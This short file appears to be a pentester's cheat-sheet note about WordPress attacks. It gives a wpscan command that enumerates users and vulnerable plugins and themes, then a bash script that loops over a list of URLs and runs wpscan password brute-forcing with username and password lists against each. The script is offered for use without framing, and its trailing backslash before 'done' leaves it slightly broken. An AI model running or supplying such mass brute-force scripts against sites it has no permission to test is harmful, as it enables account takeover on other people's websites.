wpscan --url https://example.com --api-token API-TOKEN --enumerate u,vp,vt

=========Create sh to run multiple bruteforces=======
#!/bin/bash

for url in $(cat urls.txt); do
  echo "[*] Scanning: $url"
  wpscan --url "http://$url" \
    --usernames usernames.txt \
    --passwords passwords.txt \
    --max-threads 5 \

done
